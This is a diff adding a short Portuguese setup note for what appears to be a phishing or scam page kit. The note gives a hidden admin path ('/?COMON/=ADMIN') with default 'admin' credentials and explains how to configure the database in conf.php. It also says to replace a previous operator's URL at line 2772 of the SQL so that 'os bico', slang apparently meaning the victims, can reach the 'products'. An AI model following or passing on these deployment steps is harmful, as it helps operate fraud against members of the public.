@@ -1,0 +1,13 @@
+opa man, para acessar o admin da tela basta dar "/?COMON/=ADMIN" depois do seu dominio tipo
+
+www.exemplo.com.br/?COMON/=ADMIN 
+
+ai senha e user e "admin" 
+
+tela foi corrigida por mim!
+
+e pronto, para fazer conexão com banco de dado basta ir no php conf.php e fazer a conexão 
+
+e nao esqueça de por a url da tela no sql para que os bico consiga acessar os produtos
+
+para isso basta ir na linha 2772 e apagar o 'https://wsemprecomtecxmixapp.com/tt' e por url da sua tela para que nao de nenhum erro!
